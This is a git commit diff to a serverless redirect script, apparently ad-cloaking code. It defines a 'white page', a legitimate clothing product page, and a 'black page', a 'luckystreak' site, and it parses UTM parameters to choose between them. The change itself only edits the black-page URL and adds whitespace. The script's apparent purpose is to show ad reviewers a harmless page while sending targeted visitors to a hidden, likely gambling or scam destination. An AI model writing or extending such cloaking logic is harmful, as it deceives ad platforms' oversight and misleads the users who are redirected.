3b8a495659dc1ea5808f9a73855a77b2d9ab2663
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-17 15:29:05 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://beechtree.pk/products/bt22502un006634-blue";
-    const blackPageURL = "https://luckystreak.lovable.app/";
+    const blackPageURL = "https://luckystreak.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
